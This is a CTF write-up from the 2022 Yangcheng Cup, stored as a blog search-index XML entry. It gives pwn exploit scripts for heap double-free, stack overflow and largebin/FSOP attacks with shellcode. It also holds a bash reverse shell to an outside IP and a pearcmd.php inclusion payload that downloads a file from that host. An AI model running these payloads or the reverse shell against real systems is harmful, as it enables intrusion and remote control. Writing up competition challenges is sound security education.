<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>羊城杯2022-Writeup</title>
    <url>/2022/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/</url>
    <content><![CDATA[<h1 id="羊城杯2022writeup"><a class="markdownIt-Anchor" href="#羊城杯2022writeup"></a> 羊城杯2022–Writeup</h1>
<p>​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3</p>
<hr>
<p>这个比赛太累了可，凌晨三点碰着枕头就睡着了，不过收获也蛮多的，这次题目很友好，不像wmCTF一样坐大牢。感谢两位大哥的实力带飞，太菜了我。全靠躺。</p>
<span id="more"></span>          
<p><img src="/.io//1280X1280.PNG" alt="1280X1280"></p>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="ycbsql"><a class="markdownIt-Anchor" href="#ycbsql"></a> YCBSQL</h3>
<p>这个应该是有了非预期，可以直接调用shell，我们直接反弹就行。</p>
<p><img src="/.io//TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/1.PNG" alt="1"></p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.system bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/101.43.255.238/7777 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/.io//2.PNG" alt="2"></p>
<h3 id="ez_linklist-v2"><a class="markdownIt-Anchor" href="#ez_linklist-v2"></a> ez_linklist-v2</h3>
<p>这个题目的漏洞就是在unlink的时候如果是unlink的头指针，那么后面的指针没有清空，就会是这样：</p>
<p>![1280X1280 (3)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (3).PNG)</p>
<p>然后在free函数的时候，如果offset是0xff，那么后面的指针就都能释放掉，因此就会产生double free。</p>
<p>![1280X1280 (4)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (4).PNG)</p>
<p>所以实际上就是一个double free的利用。这里我一开始是用的9.7的libc，之后直接改成9.2的就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">23916</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">link</span>(<span class="params">id1,id2</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link from:&quot;</span>,<span class="built_in">str</span>(id1))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link to:&quot;</span>,<span class="built_in">str</span>(id2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlink</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0X451</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">unlink(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Offset 1:&quot;</span>)</span><br><span class="line">heap_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2e0</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">unlink(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x450</span>)+p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;z&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">8</span>)+p64(heap_base+<span class="number">0x460</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">libc_base=u64(r.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x10</span> -<span class="number">96</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(free_hook)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fakenooutput"><a class="markdownIt-Anchor" href="#fakenooutput"></a> fakeNoOutput</h3>
<p>这道题目就有点难受，首先是一堆的逆向操作。但是实际上就是一个栈溢出，并且溢出了非常多的字节。但是想要让程序执行到溢出点还是有点的困难。首先我们发现溢出点在upload里面的strcpy(s, haystack);这个部分，然后我们只需要让函数调用upload就可以溢出。但是首先要通过sub_804976F这个函数里面的验证，经过逆向调试发现，就是一个伪随机数，我们直接输入就行。然后溢出的自己大小和Content-Length有较大的关系，因此我们要设置Content-Length的大小来控制溢出的长度。之后由于函数限制的原因，无法ret2libc，因此我们经过精心构造，返回到http_puts函数，然后就能够泄露出got表里的内容，之后再返回主函数再溢出一次就行，就能够拿到shell。让人十分不解的是不知道为什么第二个端口一直打不通，泄露不出来东西，第一个端口多跑两次就能够打通远端。</p>
<p>![1280X1280(6)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280(6).PNG)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> execve</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">20432</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0x4022\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:wR5qH796Ky8D03r2W7syLB7406e30xP7\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">strstr_plt=elf.plt[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line"><span class="comment"># payload=(p32(0x804D1a0)+p32(0x8049F77)+p32(0x804D010)).rjust(0x1040,b&#x27;a&#x27;)+p32(0x804D1A0+0x103c-8)+p32(0x80496A8)</span></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1040</span>+p32(<span class="number">0x804D1A0</span>+<span class="number">0x4000</span>-<span class="number">4</span>)+p32(<span class="number">0x80496A8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x4000</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(<span class="number">0x8049F77</span>)+p32(<span class="number">0x804D010</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u32(r.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">execve_addr=libc_base+libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0xcc9ab</span></span><br><span class="line">gadget2=<span class="number">0x145f43</span></span><br><span class="line">gadget3=<span class="number">0x145f44</span></span><br><span class="line">one_gadget=libc_base+gadget1</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0xece\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:5lnPP74OkC4N9U8smBU812Smk1XxvRBJ\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xe9c</span>+p32(execve_addr)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="dream"><a class="markdownIt-Anchor" href="#dream"></a> Dream</h3>
<p>说是dream，实际上就是一个largebin attack，然后UAF漏洞，函数功能还都比较齐全。主要是开启了沙箱不能拿到shell，并且show函数里面有一个加密的过程，想要泄露数据必须要完成逆向，之后我们直接利用qwb里面house of cat的做法，一次largebin attack攻击malloc assert即可实现orw读取flag并泄露。</p>
<p>![1280X1280(6)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280(6).PNG)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">26422</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to wake?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream do you want to show?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to make?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">payload,<span class="built_in">len</span></span>):</span><br><span class="line">   key = [<span class="number">9</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">   v9 = <span class="number">52</span> // <span class="built_in">len</span> + <span class="number">6</span></span><br><span class="line">   delta = <span class="number">0</span></span><br><span class="line">   delta -= v9 * <span class="number">0x61C88647</span></span><br><span class="line">   delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line">   bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(v9):</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>)[::-<span class="number">1</span>]:</span><br><span class="line">         fd = payload[i - <span class="number">1</span>]</span><br><span class="line">         payload[i] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">         payload[i] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">         bk = payload[i]</span><br><span class="line">      i -= <span class="number">1</span></span><br><span class="line">      fd = payload[<span class="built_in">len</span> - <span class="number">1</span>]</span><br><span class="line">      payload[<span class="number">0</span>] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">      payload[<span class="number">0</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">      bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">      delta += <span class="number">0x61C88647</span></span><br><span class="line">      delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">      v9-=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payloads=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x420</span>//<span class="number">4</span>):</span><br><span class="line">    payloads.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads=de(payloads,<span class="number">0x420</span>//<span class="number">4</span>)</span><br><span class="line">main_arena=(payloads[<span class="number">0</span>]+(payloads[<span class="number">1</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">96</span></span><br><span class="line">libc_base=main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stderr_addr=libc_base+libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">set_context=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>//<span class="number">4</span>):</span><br><span class="line">    payloads1.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads1=de(payloads1,<span class="number">0x400</span>//<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">heap_base=(payloads1[<span class="number">2</span>]+(payloads1[<span class="number">3</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload=p64(main_arena+<span class="number">96</span>)*<span class="number">2</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x410</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(heap_base&gt;&gt;<span class="number">12</span>)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stderr_addr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x438</span>+p64(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_io_addr=heap_base+<span class="number">0xad0</span> </span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(heap_base)         </span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xee0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)</span><br><span class="line">fake_IO_FILE +=p64(set_context)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1e4f80</span>+<span class="number">0x10</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">shellcode_addr=heap_base+<span class="number">0xee0</span>+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">frame.rsp = shellcode_addr+<span class="number">0x20</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x10000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">shellcode=asm(code)</span><br><span class="line">payload=<span class="built_in">bytes</span>(frame)[<span class="number">0x20</span>:].ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(shellcode_addr+<span class="number">0x28</span>)+shellcode</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4f0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="rce_me"><a class="markdownIt-Anchor" href="#rce_me"></a> rce_me</h3>
<p>扫进程扫到了这个</p>
<p>![1280X1280 (6)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (6).PNG)</p>
<p>直接读根目录/flag，没有权限，应该是需要连木马提权</p>
<p>![1280X1280 (7)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (7).PNG)</p>
<p>找了一圈死活找不到可以包含的文件，最后要拿pearcmd.php去下载文件然后包含，过滤的字符串可以url编码绕过。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/%70%65%61%72cmd.php&amp;+download+http://101.43.255.238/1.txt</span><br></pre></td></tr></table></figure>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (8).PNG)</p>
<p>下载文件直接到web目录成功</p>
<p>![img](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (9).PNG)</p>
